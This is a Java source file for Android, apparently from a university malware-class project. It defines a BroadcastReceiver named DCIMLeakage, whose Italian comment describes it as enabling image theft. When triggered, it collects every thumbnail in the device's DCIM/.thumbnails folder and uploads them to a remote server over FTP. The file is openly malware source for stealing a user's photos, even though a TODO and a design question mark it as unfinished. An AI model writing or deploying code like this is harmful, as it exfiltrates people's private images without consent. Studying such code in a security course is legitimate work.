package com.malwareclass.malwareproject;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.util.Log;

import java.io.File;

/**
 * Permette il furto delle immagini
 * DA CONSIDERARE: immagine full-size o scalata o thumbnail?
 */
public class DCIMLeakage extends BroadcastReceiver {
    private static final String TAG = "DCIMLeakage";

    @Override
    public void onReceive(Context context, Intent intent) {

        // TODO

        Log.d(TAG, "started");


        File thumbnailsDir = new File(
                Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getPath()
                        + "/.thumbnails/");

        File[] thumbnails = thumbnailsDir.listFiles();

        FTP ftp = FTP.getInstance();

        if ( thumbnails!=null && thumbnails.length>0)
            ftp.upload(thumbnails);
    }
}

